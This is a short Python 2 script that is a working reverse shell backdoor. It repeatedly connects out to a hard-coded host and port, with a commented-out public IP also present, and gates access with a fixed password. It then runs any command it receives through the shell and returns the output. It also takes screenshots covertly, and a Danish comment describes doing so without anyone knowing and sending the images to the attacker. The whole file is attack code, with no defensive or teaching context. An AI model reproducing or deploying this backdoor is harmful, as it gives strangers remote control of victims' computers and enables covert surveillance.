#!/usr/bin/env python
import os
import socket
import subprocess
import time
# host = "80.210.76.214"
host = '10.1.0.99'
port = 44444
password = 'n0tm1ne'


def passwd():
    thetry = ''
    while password != thetry:
        s.send('password pleas:')
        thetry = str(s.recv(1024)[:-1:])
        if thetry == password:
            shell()
        else:
            s.send('try again \n')


def shell():
    while True:
        s.send('\n' + os.getcwd() + '>> ')
        command = s.recv(1024)[:-1:]      # [:1:] cutter \n af
        if len(command) > 0:
            if command[:8] == 'shutdown':
                s.send('Just reconnect if you want. But bye for now \n')
                s.close()
                break

            elif 'stopnow' in command:
                s.send('Bye \n')
                quit()

            elif 'cd' in command and len(command) > 0:
                try:
                    os.chdir(command.split(' ')[1])
                except Exception as e:
                    s.send(str(e))
            elif 'screenshot' in command:
                takepic = 'screencapture screenshot.jpg'
                subprocess.Popen(takepic, shell=True)
                # todo faa den til at sende til attacker og slet efter
                # men ind til videre er det en god maade at tage screenshots paa uden nogen ved det
            else:
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = cmd.stdout.read()+cmd.stderr.read()
                s.send(output)
        else:
            continue


while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception:
        continue
    passwd()
    time.sleep(3)
